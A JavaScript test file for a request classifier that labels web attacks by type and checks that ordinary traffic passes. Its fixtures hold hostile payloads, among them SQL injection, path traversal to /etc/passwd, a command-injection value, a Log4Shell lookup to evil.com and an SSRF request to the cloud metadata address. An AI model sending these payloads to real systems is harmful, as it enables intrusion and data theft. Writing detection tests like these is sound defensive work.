import { test } from '@japa/runner'
import { classifyRequest } from '#services/attack_classifier'

test('tags payloads, probes and tool user agents', ({ assert }) => {
  assert.equal(classifyRequest('/item?id=1%27%20UNION%20SELECT%20password%20FROM%20users--', null), 'sqli')
  assert.equal(classifyRequest("/search?q=x'+or+'1", null), 'sqli')
  assert.equal(classifyRequest('/?q=%3Cscript%3Ealert(1)%3C/script%3E', null), 'xss')
  assert.equal(classifyRequest('/download?f=../../etc/passwd', null), 'lfi')
  assert.equal(classifyRequest('/download?f=%2e%2e%2fetc', null), 'lfi')
  assert.equal(classifyRequest('/?page=php://filter/resource=index', null), 'lfi')
  assert.equal(classifyRequest('/ping?host=1.1.1.1;cat%20/etc/hosts', null), 'cmdi')
  assert.equal(classifyRequest('/?x=${jndi:ldap://evil.com/a}', null), 'log4shell')
  assert.equal(classifyRequest('/?name={{7*7}}', null), 'ssti')
  assert.equal(classifyRequest('/fetch?url=http://169.254.169.254/latest/meta-data', null), 'ssrf')
  assert.equal(classifyRequest('/%0d%0aSet-Cookie:x=1', null), 'crlf')
  assert.equal(classifyRequest('/.env', null), 'probe')
  assert.equal(classifyRequest('/api/.git/config', null), 'probe')
  assert.equal(classifyRequest('/wp-login.php', null), 'probe')
  assert.equal(classifyRequest('/', 'Mozilla/5.0 (compatible; Nuclei - Open-source project)'), 'scanner')
  // exploit wins over the tool that sent it
  assert.equal(classifyRequest('/?id=1+or+1=1', 'sqlmap/1.7'), 'sqli')
})

test('leaves normal traffic alone', ({ assert }) => {
  for (const path of [
    '/',
    '/login',
    '/dashboard',
    '/api/users?page=2&sort=name',
    '/blog/how-to-select-items-from-a-list',
    '/auth/callback?next=https://app.example.com/home',
    '/search?q=rock+and+roll',
    '/_next/static/chunks/app.js',
    '/.well-known/acme-challenge/abc',
  ]) {
    assert.isNull(classifyRequest(path, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/140.0'), path)
  }
  assert.isNull(classifyRequest(null, null))
})
